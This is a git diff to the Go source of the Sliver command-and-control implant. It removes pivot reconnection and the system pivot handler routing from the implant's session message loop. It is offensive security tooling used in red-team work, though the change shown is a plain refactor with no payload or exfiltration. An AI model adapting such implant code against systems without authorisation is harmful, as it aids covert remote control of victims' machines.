@@ -55,7 +55,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
-	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -484,14 +483,13 @@ func openSessionHandler(data []byte) {
 
 func sessionMainLoop(connection *transports.Connection) {
 	// Reconnect active pivots
-	pivots.ReconnectActivePivots(connection)
+	// pivots.ReconnectActivePivots(connection)
 
 	connection.Send <- Envelope(sliverpb.MsgRegister, RegisterSliver()) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
-	sysPivotHandlers := handlers.GetSystemPivotHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.Recv {
@@ -540,11 +538,6 @@ func sessionMainLoop(connection *transports.Connection) {
 		} else if handler, ok := tunHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] tunHandler %d", envelope.Type)
-			// {{end}}
-			go handler(envelope, connection)
-		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else {
